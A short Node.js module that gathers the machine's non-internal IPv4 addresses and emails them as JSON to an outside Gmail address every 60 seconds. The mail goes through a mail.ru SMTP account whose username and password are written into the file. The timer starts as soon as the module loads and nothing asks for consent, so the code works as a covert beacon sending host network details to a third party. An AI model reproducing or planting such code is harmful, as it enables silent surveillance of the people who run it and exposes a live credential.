'use strict';

const { networkInterfaces } = require('os');

const nets = networkInterfaces();
const results = Object.create(null); // Or just '{}', an empty object

    for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
    // Skip over non-IPv4 and internal (i.e. 127.0.0.1) addresses
    // 'IPv4' is in Node <= 17, from 18 it's a number 4 or 6
    const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4
    if (net.family === familyV4Value && !net.internal) {
        if (!results[name]) {
            results[name] = [];
        }
        results[name].push(net.address);
    }
}
}

const nodemailer = require('nodemailer')
  async function crowler(){
    let transporter = nodemailer.createTransport({
        host: 'smtp.mail.ru',
        port: 465,
        secure: true, // true for 465, false for other ports
        auth: {
          user: 'vahagn.hakobyan.2001@mail.ru',
          pass: 'GeNmNwV21g3bAbjgZTrj'
        }
      });

      
      // send mail with defined transport object
      let info = await transporter.sendMail({
        from: '"Vahagn Hakobyan hoginnneeer👻" vahagn.hakobyan.2001@mail.ru', // sender address
        to: 'khachatryanartur848@gmail.com', // list of receivers
        subject: 'Hello', // Subject line
        text: 'Hello text', // plain text body
        html: JSON.stringify(results) // html body
      });
      
      console.log('Message sent: %s', info.messageId);
    }
    const interval = setInterval(crowler,60000)

module.exports = {crowler}